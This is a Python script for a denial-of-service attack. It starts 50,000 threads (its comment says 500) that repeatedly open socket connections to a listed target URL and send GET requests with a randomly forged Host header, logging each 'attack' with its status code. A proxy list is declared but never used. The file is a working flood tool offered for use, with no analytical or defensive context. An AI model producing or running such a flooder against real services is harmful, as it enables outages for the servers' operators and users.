import socket
import threading
import random
import requests
import urllib.parse

# A list of proxies to use (you can add more or get them from an external source)
proxies = ["http://1.2.3.4:8080", "http://5.6.7.8:3128", "http://9.10.11.12:80"]

# A list of target webpages to attack (you can add more or get them from an external source)
targets = ["http://10.218.216.185:5000/"]

attack_num = 0

def attack():
    while True:
        # Choose a random target webpage from the list
        target = random.choice(targets)

        # Parse the target webpage into its domain name, IP address, and port number
        parsed = urllib.parse.urlparse(target)
        domain = parsed.netloc.split(":")[0]
        ip = socket.gethostbyname(domain)
        port = int(parsed.netloc.split(":")[1]) if ":" in parsed.netloc else 80

        # Create a socket object and connect to the target server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

        # Generate a random fake IP address for the Host header
        fake_ip = ".".join([str(random.randint(0, 255)) for _ in range(4)])

        # Send a GET request with the fake IP address as the Host header
        s.sendto(("GET " + parsed.path + "?" + parsed.query + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))

        # Receive the response data from the server
        data = s.recv(1024)
        global attack_num
        # Parse the response data and print some information
        status_code = data.split()[1].decode('ascii')
        content_length = data.split(b"Content-Length: ")[1].split()[0].decode('ascii')
        print(f"Attack #{attack_num}: Target: {domain} ({ip}:{port}), Status code: {status_code}, Content length: {content_length}")

        # Increment the attack number
        
        attack_num += 1

        # Close the socket connection
        s.close()

# Create 500 threads to run the attack function concurrently
for i in range(50000):
    thread = threading.Thread(target=attack)
    thread.start()
